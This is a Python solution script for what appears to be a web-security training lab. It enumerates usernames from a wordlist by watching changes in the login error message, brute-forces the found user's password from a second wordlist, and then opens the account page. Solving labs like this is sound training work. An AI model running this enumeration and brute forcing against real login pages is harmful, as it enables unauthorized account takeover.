import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac341fab1f0cf182c074457b00100020.web-security-academy.net'

#Given the site name, use python to construct the login page 
#using f-string will serve as a template to directly include values of variables
login_url = f'''https://{site}/login'''

lines = open('auth-lab-usernames', "r").readlines()

#Goes through list of usernames till one is located
for user in lines:
    target = user.strip()
    logindata = {
        'username' : target,
        'password' : 'foo'
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    if 'username' not in soup.find('p', {'class':'is-warning'}).text:
        print(f'username is {target}')
        break

#Goes through the password list undtil there is no more is-warning class
pass_lines = open('auth-lab-passwords', "r").readlines()
for password in pass_lines:
    target_p = password.strip()
    logindata = {
        'username' : target,
        'password' : target_p
    }
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('p', {'class':'is-warning'}) is None:
        print(f'password is {target_p}')
        break

#goes to link to complete CTF
s.get(f'https://{site}/my-account?id={target}')